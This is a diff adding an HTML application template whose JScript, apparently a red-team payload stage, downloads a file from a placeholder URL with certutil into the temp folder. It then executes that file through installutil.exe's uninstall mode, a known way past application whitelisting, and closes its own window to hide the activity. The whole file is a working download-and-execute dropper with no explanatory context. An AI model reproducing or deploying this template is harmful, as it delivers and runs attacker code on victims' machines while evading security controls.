@@ -1,0 +1,14 @@
+<html>
+    <head>
+        <script language="JScript">
+            var shell = new ActiveXObject("WScript.Shell");
+            shell.Run("certutil -urlcache -f {{url}} %temp%\\{{filename}}");
+            shell.Run("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\installutil.exe /logfile= /LogToConsole=false /U / %temp%\\{{filename}}");
+        </script>
+    </head>
+    <body>
+        <script language="JScript">
+            self.close();
+        </script>
+    </body>
+</html>
